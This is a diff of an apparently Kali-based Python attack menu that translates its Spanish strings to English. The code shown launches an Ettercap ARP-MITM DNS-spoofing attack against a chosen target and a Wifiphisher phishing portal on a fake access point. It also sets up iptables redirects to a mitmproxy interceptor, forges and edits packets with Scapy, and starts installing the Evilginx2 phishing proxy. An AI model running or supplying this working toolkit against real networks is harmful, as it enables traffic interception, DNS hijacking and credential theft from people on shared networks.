-        ip_destino = input(f"Ingrese la IP destino para {dominio} (por ejemplo, 87.240.183.90): ").strip()
-        # Validar que la IP sea correcta
+        destination_ip = input(YELLOW + f"Enter the destination IP for {domain} (e.g., 87.240.183.90): " + RESET).strip()
+        # Validate that the IP address is correct
         try:
-            ipaddress.ip_address(ip_destino)
+            ipaddress.ip_address(destination_ip)
         except ValueError:
-            print("[-] La IP ingresada no es válida.")
+            print(RED + "[-] The entered IP is not valid." + RESET)
             continue
 
-        redirecciones.append((dominio, ip_destino))
-    return redirecciones
+        redirections.append((domain, destination_ip))
+    return redirections
 
-        
-        
 
 def start_dns_spoof_attack():
-    iface = input("Ingrese la interfaz para el ataque DNS Spoofing (dejar en blanco para usar la interfaz AP): ").strip()
+    iface = input(YELLOW + "Enter the interface for the DNS Spoofing attack (leave blank to use the AP interface): " + RESET).strip()
     if iface == "" and ap_interface_global is not None:
         iface = ap_interface_global
     if not iface:
-        print("[-] No se ha seleccionado una interfaz para DNS Spoofing.")
+        print(RED + "[-] No interface selected for DNS Spoofing." + RESET)
         return
 
-    objetivo = seleccionar_objetivo()
-    if not objetivo:
-        print("[-] No se encontró un objetivo para DNS Spoofing.")
+    target = select_target()
+    if not target:
+        print(RED + "[-] No target found for DNS Spoofing." + RESET)
         return
-    target_ip = objetivo.get("IP")
+    target_ip = target.get("IP")
     if not target_ip:
-        print("[-] No se encontró la IP del objetivo.")
+        print(RED + "[-] No IP found for the target." + RESET)
         return
 
     gateway_ip = get_default_gateway()
     if not gateway_ip:
-        print("[-] No se pudo obtener la IP del gateway.")
+        print(RED + "[-] Could not obtain the gateway IP." + RESET)
         return
     
-    
-    
-    # Antes de iniciar el ataque DNS Spoofing, redirige google.com a yandex.com
-    # Solicitar múltiples redirecciones al usuario
-    redirecciones = solicitar_redirecciones()
-    if not redirecciones:
-        print("[-] No se ingresaron redirecciones.")
+    # Before starting the DNS Spoofing attack, prompt for multiple redirections
+    redirections = request_redirections()
+    if not redirections:
+        print(RED + "[-] No redirections were entered." + RESET)
         return
 
+    # For each entered pair, update the etter.dns file
+    for domain, destination_ip in redirections:
+        configure_etter_dns(domain, destination_ip)
 
-   # Para cada par ingresado, actualizamos el archivo etter.dns
-    for dominio, ip_destino in redirecciones:
-        configurar_etter_dns(dominio, ip_destino)
-
-
-    # Cambiar a iptables-legacy antes de iniciar Ettercap
+    # Switch to iptables-legacy before starting Ettercap
     set_iptables_legacy()    
     
-    # Edita automáticamente etter.conf para asegurar la redirección SSL
-    configurar_ettercap_conf()    
+    # Automatically edit etter.conf to secure SSL redirection
+    configure_ettercap_conf()    
 
-    print(f"Iniciando ataque DNS Spoofing en la interfaz {iface} contra el objetivo {target_ip} con gateway {gateway_ip} usando Ettercap (modo GUI)...")
-    print("Se abrirá una nueva ventana de terminal con Ettercap en modo gráfico (GTK).")
-    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
+    print(GREEN + f"Starting DNS Spoofing attack on interface {iface} against target {target_ip} with gateway {gateway_ip} using Ettercap (GUI mode)..." + RESET)
+    print(CYAN + "A new terminal window will open with Ettercap in graphical (GTK) mode." + RESET)
+    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
     
     try:
-        # Creamos el caplet con los comandos necesarios
-        caplet_file = crear_caplet_dns_spoof(target_ip)
-        # Lanzamos Ettercap en modo gráfico (-G), con el plugin de DNS spoof (-P dns_spoof)
-        # y con MITM remoto (-M arp:remote) usando la sintaxis TARGET con campos vacíos.
+        # Create the caplet with the necessary commands
+        caplet_file = create_dns_spoof_caplet(target_ip)
+        # Launch Ettercap in GUI mode (-G), with the DNS spoof plugin (-P dns_spoof)
+        # and remote MITM (-M arp:remote) using the TARGET syntax with empty fields.
         cmd = (
             f"gnome-terminal -- bash -c 'sudo ettercap -G -S -i {iface} -P dns_spoof -M arp:remote \"//{target_ip}//\" \"//{gateway_ip}//\" -caplet {caplet_file}; exec bash'"
         )
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para volver al menú principal...")
+        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("Ataque DNS Spoofing detenido.")
+        print(GREEN + "DNS Spoofing attack stopped." + RESET)
     except Exception as e:
-        print("Error al iniciar Ettercap para DNS Spoofing:", e)
+        print(RED + "Error starting Ettercap for DNS Spoofing:" + str(e) + RESET)
     finally:
-        # Restaurar la configuración de iptables a nft
+        # Restore iptables configuration back to nft
         restore_iptables_nft()
-            
+
 
 def start_phishing_portal():
-    iface = input("Ingrese la interfaz para el portal de phishing (dejar en blanco para usar la interfaz AP): ").strip()
+    iface = input(YELLOW + "Enter the interface for the phishing portal (leave blank to use the AP interface): " + RESET).strip()
     if iface == "" and ap_interface_global is not None:
         iface = ap_interface_global
     if not iface:
-        print("[-] No se ha seleccionado una interfaz para el portal de phishing.")
+        print(RED + "[-] No interface selected for the phishing portal." + RESET)
         return
-    print("Seleccione el modo de ataque para Wifiphisher:")
-    print("  1) Atacar únicamente el AP Fake")
-    print("  2) Escanear todas las redes disponibles")
-    modo = input("Ingrese 1 o 2: ").strip()
-    if modo == "1":
+    print(GREEN + "Select the attack mode for Wifiphisher:" + RESET)
+    print(CYAN + "  1) Attack only the Fake AP" + RESET)
+    print(CYAN + "  2) Scan all available networks" + RESET)
+    mode = input(YELLOW + "Enter 1 or 2: " + RESET).strip()
+    if mode == "1":
         if fake_ap_ssid_global:
             essid_fake = fake_ap_ssid_global
-            print(f"Se utilizará el ESSID del Fake AP: {essid_fake}")
+            print(GREEN + f"The Fake AP ESSID will be used: {essid_fake}" + RESET)
         else:
-            print("[-] No se encontró un ESSID para el Fake AP. Por favor, cree el AP primero.")
+            print(RED + "[-] No ESSID found for the Fake AP. Please create the AP first." + RESET)
             return
     else:
         essid_fake = ""
-    print(f"Iniciando Portal de Phishing con Wifiphisher en la interfaz {iface}...")
-    print("Se abrirá una nueva ventana de terminal con Wifiphisher en modo interactivo.")
-    print("En esa ventana podrás seleccionar el escenario de phishing deseado.")
-    print("Cuando termines, cierra la ventana o presiona ENTER aquí para volver al menú principal.")
+    print(GREEN + f"Starting Phishing Portal with Wifiphisher on interface {iface}..." + RESET)
+    print(CYAN + "A new terminal window will open with Wifiphisher in interactive mode." + RESET)
+    print(CYAN + "Inside that window you can select the desired phishing scenario." + RESET)
+    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
     try:
-        if modo == "1":
+        if mode == "1":
             cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -e \"{essid_fake}\" -kN; exec bash'"
         else:
             cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -kN; exec bash'"
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para volver al menú principal...")
+        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("Portal de Phishing detenido.")
+        print(GREEN + "Phishing Portal stopped." + RESET)
     except Exception as e:
-        print("Error al iniciar Wifiphisher:", e)
-        
-        
+        print(RED + "Error starting Wifiphisher:" + str(e) + RESET)
+
+
 def sniffing_menu():
     while True:
-        print("""
-[ANÁLISIS E INYECCIÓN]
-  1) Captura pasiva (Wireshark)
-  2) Captura y Análisis Avanzado (Scapy)
-  3) Inyectar Paquete ICMP (Scapy)
-  4) Manipular Paquetes (Scapy)
-  5) Volver al menú principal
-        """)
-        opcion = input("Seleccione una opción: ").strip()
-        if opcion == "1":
+        print(BLUE + """
+[ANALYSIS & INJECTION]
+  1) Passive Capture (Wireshark)
+  2) Capture and Advanced Analysis (Scapy)
+  3) Inject ICMP Packet (Scapy)
+  4) Manipulate Packets (Scapy)
+  5) Back to Main Menu
+""" + RESET)
+        option = input(YELLOW + "Select an option: " + RESET).strip()
+        if option == "1":
             start_sniffing_traffic()
-        elif opcion == "2":
-            scapy_analisis_avanzado()
-        elif opcion == "3":
-            inyectar_paquete_icmp()
-        elif opcion == "4":
-            manipular_paquete_tcp()
-        elif opcion == "5":
+        elif option == "2":
+            advanced_scapy_analysis()
+        elif option == "3":
+            inject_icmp_packet()
+        elif option == "4":
+            manipulate_tcp_packet()
+        elif option == "5":
             break
         else:
-            print("[-] Opción inválida, intente de nuevo.\n")        
+            print(RED + "[-] Invalid option, please try again.\n" + RESET)
+
 
 def start_sniffing_traffic():
-    iface = input("Ingrese la interfaz para sniffing de tráfico: ").strip()
+    iface = input(YELLOW + "Enter the interface for traffic sniffing: " + RESET).strip()
     if not iface:
-        print("[-] No se ha seleccionado una interfaz.")
+        print(RED + "[-] No interface selected." + RESET)
         return
     log_path = "/home/kali/Desktop/tcpdump_capture.pcap"
-    print(f"[+] Iniciando tcpdump en la interfaz {iface}. La captura se guardará en {log_path}.")
+    print(GREEN + f"[+] Starting tcpdump on interface {iface}. The capture will be saved to {log_path}." + RESET)
     cmd = f"gnome-terminal -- bash -c 'sudo tcpdump -i {iface} -w {log_path}; exec bash'"
     try:
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para detener el sniffing...")
+        input(YELLOW + "Press ENTER to stop sniffing..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("[+] Sniffing detenido.")
+        print(GREEN + "[+] Sniffing stopped." + RESET)
     except Exception as e:
-        print("[-] Error al iniciar tcpdump:", e)
-        
+        print(RED + "[-] Error starting tcpdump:" + str(e) + RESET)
+
+
 def get_interface_ips(interface):
     import subprocess
     ips = []
@@ -740,41 +801,41 @@ def get_interface_ips(interface):
         for line in result.stdout.splitlines():
             line = line.strip()
             if line.startswith("inet ") and "inet6" not in line:
-                # Extrae la IP (sin la máscara)
+                # Extract the IP (without the mask)
                 ip = line.split()[1].split("/")[0]
                 ips.append(ip)
     except Exception as e:
-        print("Error obteniendo IPs de la interfaz:", e)
+        print(RED + "Error obtaining IPs for the interface:" + str(e) + RESET)
     return ips
 
 
-def scapy_analisis_avanzado():
+def advanced_scapy_analysis():
     try:
         from scapy.all import sniff, wrpcap, get_if_list
     except ImportError:
-        print("[-] Scapy no está instalado. Intente instalarlo con: pip install scapy")
+        print(RED + "[-] Scapy is not installed. Try installing it with: pip install scapy" + RESET)
         return
     
     import sys, subprocess
 
-    # Obtener la lista de interfaces disponibles
+    # Get the list of available interfaces
     interfaces = get_if_list()
     if not interfaces:
-        print("[-] No se encontraron interfaces disponibles.")
+        print(RED + "[-] No interfaces found." + RESET)
         return
     
-    print("[+] Interfaces disponibles:")
+    print(GREEN + "[+] Available interfaces:" + RESET)
     for idx, iface in enumerate(interfaces, start=1):
-        print(f"  [{idx}] {iface}")
+        print(CYAN + f"  [{idx}] {iface}" + RESET)
     
     try:
-        choice = int(input("Seleccione la interfaz por número: ").strip())
+        choice = int(input(YELLOW + "Select the interface by number: " + RESET).strip())
         iface = interfaces[choice - 1]
     except Exception as e:
-        print("[-] Selección inválida.", e)
+        print(RED + "[-] Invalid selection." + str(e) + RESET)
         return
 
-    # Función auxiliar para obtener IPs de la interfaz
+    # Helper function to obtain IPs for the interface
     def get_interface_ips(interface):
         ips = []
         try:
@@ -785,254 +846,251 @@ def scapy_analisis_avanzado():
                     ip = line.split()[1].split("/")[0]
                     ips.append(ip)
         except Exception as e:
-            print("Error obteniendo IPs de la interfaz:", e)
+            print(RED + "Error obtaining IPs for the interface:" + str(e) + RESET)
         return ips
 
     ips = get_interface_ips(iface)
     if not ips:
-        print("[-] No se encontraron IPs asignadas en la interfaz seleccionada.")
+        print(RED + "[-] No IPs assigned to the selected interface." + RESET)
     elif len(ips) == 1:
         chosen_ip = ips[0]
-        print(f"[+] La única IP asignada a {iface} es: {chosen_ip}")
+        print(GREEN + f"[+] The only IP assigned to {iface} is: {chosen_ip}" + RESET)
     else:
-        print("[+] IPs asignadas en la interfaz:")
+        print(GREEN + "[+] IPs assigned to the interface:" + RESET)
         for idx, ip in enumerate(ips, start=1):
-            print(f"  [{idx}] {ip}")
+            print(CYAN + f"  [{idx}] {ip}" + RESET)
         try:
-            ip_choice = int(input("Seleccione el número de la IP a utilizar: ").strip())
+            ip_choice = int(input(YELLOW + "Select the number of the IP to use: " + RESET).strip())
             chosen_ip = ips[ip_choice - 1]
         except Exception as e:
-            print("[-] Selección inválida, se utilizará la primera IP:", ips[0])
+            print(RED + "[-] Invalid selection, defaulting to the first IP:" + str(ips[0]) + RESET)
             chosen_ip = ips[0]
-        print(f"[+] Se seleccionó la IP: {chosen_ip}")
+        print(GREEN + f"[+] Selected IP: {chosen_ip}" + RESET)
     
-    filter_expr = input("Ingrese un filtro BPF (opcional, ej: tcp port 80): ").strip()
-    timeout_str = input("Ingrese el tiempo de captura en segundos (por defecto 30): ").strip()
+    filter_expr = input(YELLOW + "Enter a BPF filter (optional, e.g., tcp port 80): " + RESET).strip()
+    timeout_str = input(YELLOW + "Enter the capture time in seconds (default 30): " + RESET).strip()
     try:
         timeout = int(timeout_str) if timeout_str else 30
     except ValueError:
-        print("[-] Tiempo no válido, usando 30 segundos.")
+        print(RED + "[-] Invalid time, using 30 seconds." + RESET)
         timeout = 30
 
-    advanced_choice = input("¿Activar modo avanzado (detalle en log) en tiempo real? (s/n): ").strip().lower()
-    advanced_mode = True if advanced_choice == "s" else False
+    advanced_choice = input(YELLOW + "Enable advanced mode (detailed log output in real time)? (y/n): " + RESET).strip().lower()
+    advanced_mode = True if advanced_choice == "y" else False
 
-    print(f"[+] Capturando paquetes en {iface} por {timeout} segundos...")
+    print(GREEN + f"[+] Capturing packets on {iface} for {timeout} seconds..." + RESET)
 
     if advanced_mode:
-        log_file = input("Ingrese el nombre del archivo de log (por defecto scapy_advanced.log): ").strip()
+        log_file = input(YELLOW + "Enter the log file name (default scapy_advanced.log): " + RESET).strip()
         if not log_file:
             log_file = "scapy_advanced.log"
-        open(log_file, "w").close()  # Limpiar el log
+        open(log_file, "w").close()  # Clear the log
         packet_counter = 0
-        def procesar_paquete(pkt):
+
+        def process_packet(pkt):
             nonlocal packet_counter
             packet_counter += 1
             with open(log_file, "a") as f:
                 f.write(pkt.show(dump=True) + "\n")
-            # Actualizar la misma línea cada 50 paquetes sin llenar el terminal
+            # Update the same line every 50 packets without cluttering the terminal
             if packet_counter % 50 == 0:
-                sys.stdout.write(f"\r[+] {packet_counter} paquetes capturados...")
+                sys.stdout.write(f"\r[+] {packet_counter} packets captured...")
                 sys.stdout.flush()
-        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout, prn=procesar_paquete)
+
+        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout, prn=process_packet)
         print("")
-        print(f"[+] Captura finalizada. Se capturaron {len(packets)} paquetes.")
-        print(f"[+] Detalles completos guardados en {log_file}.")
+        print(GREEN + f"[+] Capture complete. {len(packets)} packets captured." + RESET)
+        print(GREEN + f"[+] Detailed log saved in {log_file}." + RESET)
     else:
         packets = sniff(iface=iface, filter=filter_expr, timeout=timeout)
-        print(f"[+] Captura finalizada. Se capturaron {len(packets)} paquetes.")
-        print("\n[+] Resumen de los primeros 5 paquetes:")
+        print(GREEN + f"[+] Capture complete. {len(packets)} packets captured." + RESET)
+        print(GREEN + "\n[+] Summary of the first 5 packets:" + RESET)
         for i, pkt in enumerate(packets[:5], start=1):
-            print(f"--- Paquete {i} ---")
+            print(CYAN + f"--- Packet {i} ---" + RESET)
             print(pkt.summary())
             print("-" * 40)
 
-    save_choice = input("¿Desea guardar la captura en un archivo pcap? (s/n): ").strip().lower()
-    if save_choice == "s":
-        filename = input("Ingrese el nombre del archivo (sin extensión, por defecto scapy_capture): ").strip()
+    save_choice = input(YELLOW + "Do you want to save the capture to a pcap file? (y/n): " + RESET).strip().lower()
+    if save_choice == "y":
+        filename = input(YELLOW + "Enter the file name (without extension, default scapy_capture): " + RESET).strip()
         if not filename:
             filename = "scapy_capture"
         filename += ".pcap"
         wrpcap(filename, packets)
-        print(f"[+] Captura guardada en {filename}.")
+        print(GREEN + f"[+] Capture saved in {filename}." + RESET)
 
-# Ejemplo de función interactiva de inyección de paquetes con Scapy:
-def inyectar_paquete_icmp():
+
+def inject_icmp_packet():
     try:
         from scapy.all import IP, ICMP, send
     except ImportError:
-        print("[-] Scapy no está instalado. Intente instalarlo con: pip install scapy")
+        print(RED + "[-] Scapy is not installed. Try installing it with: pip install scapy" + RESET)
         return
-    target_ip = input("Ingrese la IP de destino para el paquete ICMP: ").strip()
-    payload = input("Ingrese un mensaje de payload (opcional): ")
+    target_ip = input(YELLOW + "Enter the destination IP for the ICMP packet: " + RESET).strip()
+    payload = input(YELLOW + "Enter an optional payload message: " + RESET)
     packet = IP(dst=target_ip) / ICMP() / payload
     send(packet)
-    print(f"[+] Paquete ICMP enviado a {target_ip}")
+    print(GREEN + f"[+] ICMP packet sent to {target_ip}" + RESET)
 
 
-def manipular_paquete_tcp():
+def manipulate_tcp_packet():
     try:
         from scapy.all import sniff, send, get_if_list, IP, TCP, Raw, Ether
     except ImportError:
-        print("[-] Scapy no está instalado. Instale Scapy con: pip install scapy")
+        print(RED + "[-] Scapy is not installed. Install Scapy with: pip install scapy" + RESET)
         return
 
     import subprocess, sys
 
-    # Mostrar algunos filtros BPF comunes (esto es solo informativo)
-    print("[+] Información: Algunos filtros BPF comunes son:")
-    print("    - 'tcp'  (capturar solo tráfico TCP)")
-    print("    - 'udp'  (capturar solo tráfico UDP)")
-    print("    - 'icmp' (capturar solo tráfico ICMP)")
-    print("    - 'tcp port 80' (capturar tráfico HTTP)")
-    print("    - 'host 192.168.1.75' (capturar tráfico de/para una IP específica)")
-    print("    Puedes combinarlos usando operadores lógicos (and, or).\n")
+    # Show some common BPF filters (for informational purposes only)
+    print(CYAN + "[+] Info: Some common BPF filters are:" + RESET)
+    print(CYAN + "    - 'tcp'  (capture only TCP traffic)" + RESET)
+    print(CYAN + "    - 'udp'  (capture only UDP traffic)" + RESET)
+    print(CYAN + "    - 'icmp' (capture only ICMP traffic)" + RESET)
+    print(CYAN + "    - 'tcp port 80' (capture HTTP traffic)" + RESET)
+    print(CYAN + "    - 'host 192.168.1.75' (capture traffic to/from a specific IP)" + RESET)
+    print(CYAN + "    You can combine them with logical operators (and, or)." + RESET)
     
-    # 1. Seleccionar la interfaz para capturar el paquete
+    # 1. Select the interface to capture the packet
     interfaces = get_if_list()
     if not interfaces:
-        print("[-] No se encontraron interfaces disponibles.")
+        print(RED + "[-] No interfaces found." + RESET)
         return
 
-    print("[+] Interfaces disponibles:")
+    print(GREEN + "[+] Available interfaces:" + RESET)
     for idx, iface in enumerate(interfaces, start=1):
-        print(f"  [{idx}] {iface}")
+        print(CYAN + f"  [{idx}] {iface}" + RESET)
     try:
-        choice = int(input("Seleccione la interfaz para capturar un paquete: ").strip())
+        choice = int(input(YELLOW + "Select the interface to capture a packet: " + RESET).strip())
         iface = interfaces[choice - 1]
     except Exception as e:
-        print("[-] Selección inválida.", e)
+        print(RED + "[-] Invalid selection." + str(e) + RESET)
         return
 
-    # 2. (Opcional) Permitir filtrar la captura por una IP de referencia
+    # 2. (Optional) Allow filtering by a reference IP
     extra_filter = ""
-    use_ip_filter = input("¿Desea agregar un filtro para una IP de referencia? (s/n): ").strip().lower()
-    if use_ip_filter == "s":
-        ref_ip = input("Ingrese la IP a filtrar (ej: la IP del dispositivo víctima): ").strip()
+    use_ip_filter = input(YELLOW + "Do you want to add a filter for a reference IP? (y/n): " + RESET).strip().lower()
+    if use_ip_filter == "y":
+        ref_ip = input(YELLOW + "Enter the IP to filter (e.g., the victim device's IP): " + RESET).strip()
         if ref_ip:
             extra_filter = f"host {ref_ip}"
     
-    filter_expr = input("Ingrese un filtro BPF (opcional, ej: tcp port 80): ").strip()
-    # Combinar filtros si se ingresó alguno extra
+    filter_expr = input(YELLOW + "Enter a BPF filter (optional, e.g., tcp port 80): " + RESET).strip()
+    # Combine filters if extra filter is provided
     if filter_expr and extra_filter:
         filter_expr = f"({filter_expr}) and ({extra_filter})"
     elif not filter_expr and extra_filter:
         filter_expr = extra_filter
 
-    timeout_str = input("Ingrese el tiempo de captura en segundos (por defecto 30): ").strip()
+    timeout_str = input(YELLOW + "Enter the capture time in seconds (default 30): " + RESET).strip()
     try:
         timeout = int(timeout_str) if timeout_str else 30
     except ValueError:
-        print("[-] Tiempo no válido, usando 30 segundos.")
+        print(RED + "[-] Invalid time, using 30 seconds." + RESET)
         timeout = 30
 
-    print(f"[+] Capturando paquete en {iface} por {timeout} segundos...")
+    print(GREEN + f"[+] Capturing a packet on {iface} for {timeout} seconds..." + RESET)
     packets = sniff(iface=iface, filter=filter_expr, count=1, timeout=timeout)
     if not packets:
-        print("[-] No se capturó ningún paquete.")
+        print(RED + "[-] No packet captured." + RESET)
         return
 
     pkt = packets[0]
-    print("\n[+] Paquete original:")
+    print(GREEN + "\n[+] Original packet:" + RESET)
     pkt.show()
 
-    # Mostrar información de las direcciones IP y MAC capturadas, si la capa existe
+    # Display captured IP and MAC info if available
     if IP in pkt:
-        print(f"[+] IP de origen capturada: {pkt[IP].src}")
-        print(f"[+] IP de destino capturada: {pkt[IP].dst}")
+        print(GREEN + f"[+] Captured source IP: {pkt[IP].src}" + RESET)
+        print(GREEN + f"[+] Captured destination IP: {pkt[IP].dst}" + RESET)
     if pkt.haslayer(Ether):
-        print(f"[+] MAC de origen capturada: {pkt[Ether].src}")
-        print(f"[+] MAC de destino capturada: {pkt[Ether].dst}")
+        print(GREEN + f"[+] Captured source MAC: {pkt[Ether].src}" + RESET)
+        print(GREEN + f"[+] Captured destination MAC: {pkt[Ether].dst}" + RESET)
     
-    # 3. Modificar campos de la capa IP (TTL y direcciones IP)
+    # 3. Modify IP layer fields (TTL and IP addresses)
     if IP in pkt:
-        if input("¿Desea modificar el TTL? (s/n): ").strip().lower() == "s":
+        if input(YELLOW + "Do you want to modify the TTL? (y/n): " + RESET).strip().lower() == "y":
             try:
-                new_ttl = int(input("Ingrese el nuevo valor para TTL: ").strip())
+                new_ttl = int(input(YELLOW + "Enter the new TTL value: " + RESET).strip())
                 original_ttl = pkt[IP].ttl
                 pkt[IP].ttl = new_ttl
-                print(f"[+] TTL modificado: {original_ttl} -> {new_ttl}")
+                print(GREEN + f"[+] TTL modified: {original_ttl} -> {new_ttl}" + RESET)
             except Exception as e:
-                print("[-] Error al modificar TTL:", e)
-        if input("¿Desea modificar las direcciones IP? (s/n): ").strip().lower() == "s":
-            new_src = input("Ingrese la nueva IP de origen (dejar en blanco para mantener la actual): ").strip()
-            new_dst = input("Ingrese la nueva IP de destino (dejar en blanco para mantener la actual): ").strip()
+                print(RED + "[-] Error modifying TTL:" + str(e) + RESET)
+        if input(YELLOW + "Do you want to modify the IP addresses? (y/n): " + RESET).strip().lower() == "y":
+            new_src = input(YELLOW + "Enter the new source IP (leave blank to keep current): " + RESET).strip()
+            new_dst = input(YELLOW + "Enter the new destination IP (leave blank to keep current): " + RESET).strip()
             if new_src:
                 original_src = pkt[IP].src
                 pkt[IP].src = new_src
-                print(f"[+] IP de origen modificada: {original_src} -> {new_src}")
+                print(GREEN + f"[+] Source IP modified: {original_src} -> {new_src}" + RESET)
             if new_dst:
                 original_dst = pkt[IP].dst
                 pkt[IP].dst = new_dst
-                print(f"[+] IP de destino modificada: {original_dst} -> {new_dst}")
-            # Forzar recálculo de longitud y checksum
+                print(GREEN + f"[+] Destination IP modified: {original_dst} -> {new_dst}" + RESET)
+            # Force recalculation of length and checksum
             del pkt[IP].len
             del pkt[IP].chksum
             if TCP in pkt:
                 del pkt[TCP].chksum
     else:
-        print("[-] El paquete no tiene capa IP, no se pueden modificar sus campos.")
+        print(RED + "[-] The packet does not have an IP layer, its fields cannot be modified." + RESET)
 
-    # 4. Modificar la dirección MAC (si la capa Ether existe)
+    # 4. Modify the MAC addresses if the Ether layer exists
     if pkt.haslayer(Ether):
-        if input("¿Desea modificar las direcciones MAC? (s/n): ").strip().lower() == "s":
-            new_mac_src = input("Ingrese la nueva MAC de origen (dejar en blanco para mantener la actual): ").strip()
-            new_mac_dst = input("Ingrese la nueva MAC de destino (dejar en blanco para mantener la actual): ").strip()
+        if input(YELLOW + "Do you want to modify the MAC addresses? (y/n): " + RESET).strip().lower() == "y":
+            new_mac_src = input(YELLOW + "Enter the new source MAC (leave blank to keep current): " + RESET).strip()
+            new_mac_dst = input(YELLOW + "Enter the new destination MAC (leave blank to keep current): " + RESET).strip()
             if new_mac_src:
                 original_mac_src = pkt[Ether].src
                 pkt[Ether].src = new_mac_src
-                print(f"[+] MAC de origen modificada: {original_mac_src} -> {new_mac_src}")
+                print(GREEN + f"[+] Source MAC modified: {original_mac_src} -> {new_mac_src}" + RESET)
             if new_mac_dst:
                 original_mac_dst = pkt[Ether].dst
                 pkt[Ether].dst = new_mac_dst
-                print(f"[+] MAC de destino modificada: {original_mac_dst} -> {new_mac_dst}")
+                print(GREEN + f"[+] Destination MAC modified: {original_mac_dst} -> {new_mac_dst}" + RESET)
     else:
-        print("[-] El paquete no tiene capa Ethernet, no se pueden modificar las direcciones MAC.")
+        print(RED + "[-] The packet does not have an Ethernet layer; MAC addresses cannot be modified." + RESET)
 
-    # 5. Modificar el payload
-    if input("¿Desea modificar el payload? (s/n): ").strip().lower() == "s":
+    # 5. Modify the payload
+    if input(YELLOW + "Do you want to modify the payload? (y/n): " + RESET).strip().lower() == "y":
         if Raw in pkt:
             original_payload = pkt[Raw].load
-            print(f"[+] Payload original: {original_payload}")
+            print(GREEN + f"[+] Original payload: {original_payload}" + RESET)
         else:
-            print("[-] El paquete no tiene capa Raw, se agregará una nueva capa Raw.")
+            print(RED + "[-] The packet does not have a Raw layer; a new Raw layer will be added." + RESET)
             original_payload = b""
-        new_payload_text = input("Ingrese el nuevo payload (texto, se convertirá a bytes): ")
+        new_payload_text = input(YELLOW + "Enter the new payload (text, will be converted to bytes): " + RESET)
         if new_payload_text:
             new_payload = new_payload_text.encode()
             if Raw in pkt:
                 pkt[Raw].load = new_payload
             else:
                 pkt = pkt / new_payload
-            # Eliminar campos para que se recalcule longitud y checksum
+            # Delete fields so that length and checksum are recalculated
             if IP in pkt:
                 del pkt[IP].len
                 del pkt[IP].chksum
             if TCP in pkt:
                 del pkt[TCP].chksum
-            print("[+] Payload modificado.")
+            print(GREEN + "[+] Payload modified." + RESET)
         else:
-            print("[-] No se ingresó nuevo payload, se mantiene el original.")
+            print(RED + "[-] No new payload entered, keeping original." + RESET)
     else:
-        print("[-] No se modificará el payload.")
+        print(RED + "[-] Payload will not be modified." + RESET)
 
-    print("\n[+] Paquete modificado:")
+    print(GREEN + "\n[+] Modified packet:" + RESET)
     pkt.show()
 
-    if input("¿Desea enviar el paquete manipulado? (s/n): ").strip().lower() == "s":
+    if input(YELLOW + "Do you want to send the manipulated packet? (y/n): " + RESET).strip().lower() == "y":
         send(pkt)
-        print("[+] Paquete manipulado enviado.")
+        print(GREEN + "[+] Manipulated packet sent." + RESET)
     else:
-        print("[-] Envío cancelado.")
+        print(RED + "[-] Send cancelled." + RESET)
 
 
-
-
-        
-
-
-def aplicar_redireccion_iptables(listen_port=8080):
-    print("[+] Aplicando reglas iptables para redirigir tráfico HTTP y HTTPS...")
+def apply_iptables_redirect(listen_port=8080):
+    print(GREEN + "[+] Applying iptables rules to redirect HTTP and HTTPS traffic..." + RESET)
     cmd = (
         f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port} ; "
         f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {listen_port}"
@@ -1040,165 +1098,159 @@ def aplicar_redireccion_iptables(listen_port=8080):
     subprocess.run(cmd, shell=True, check=False)
 
 
-        
 def start_proxy_mitm_attack():
-    iface = seleccionar_interfaz()
+    iface = select_interface()
     if iface is None:
-        print("[-] No se ha seleccionado una interfaz para mitmproxy.")
+        print(RED + "[-] No interface selected for mitmproxy." + RESET)
         return
 
     ip_address = get_interface_ip(iface)
     if ip_address is None:
-        print("[-] No se pudo obtener la IP de la interfaz.")
+        print(RED + "[-] Could not obtain the IP for the interface." + RESET)
         return
 
-    # Aplica la redirección para capturar tráfico HTTP
-    aplicar_redireccion_iptables(listen_port=8080)
+    # Apply redirection to capture HTTP traffic
+    apply_iptables_redirect(listen_port=8080)
 
-    print(f"[+] Iniciando mitmproxy en la IP {ip_address} (interfaz {iface}). Se abrirá una nueva ventana de terminal.")
+    print(GREEN + f"[+] Starting mitmproxy on IP {ip_address} (interface {iface}). A new terminal window will open." + RESET)
     try:
         cmd = f"gnome-terminal -- bash -c 'sudo mitmproxy --intercept \"\" --listen-host {ip_address}; exec bash'"
         proc = subprocess.Popen(cmd, shell=True)
-        input("Presiona ENTER para detener mitmproxy...")
+        input(YELLOW + "Press ENTER to stop mitmproxy..." + RESET)
         proc.terminate()
         proc.wait(timeout=5)
-        print("[+] mitmproxy detenido.")
+        print(GREEN + "[+] mitmproxy stopped." + RESET)
     except Exception as e:
-        print("[-] Error al iniciar mitmproxy:", e)
+        print(RED + "[-] Error starting mitmproxy:" + str(e) + RESET)
 
 
-def instalar_evilginx2():
+def install_evilginx2():
     import os
     import subprocess
 
-    # Verificar si Evilginx2 ya está instalado (buscando el comando 'evilginx2')
+    # Check if Evilginx2 is already installed (by searching for the 'evilginx2' command)
     try:
         result = subprocess.run(["which", "evilginx2"], capture_output=True, text=True)
         if result.stdout.strip():
-            print("[+] Evilginx2 ya está instalado.")
+            print(GREEN + "[+] Evilginx2 is already installed." + RESET)
             return
     except Exception as e:
-        print("[-] Error al verificar Evilginx2:", e)
+        print(RED + "[-] Error checking Evilginx2:" + str(e) + RESET)
     
-    print("[+] Instalando dependencias para Evilginx2 (golang-go y git)...")
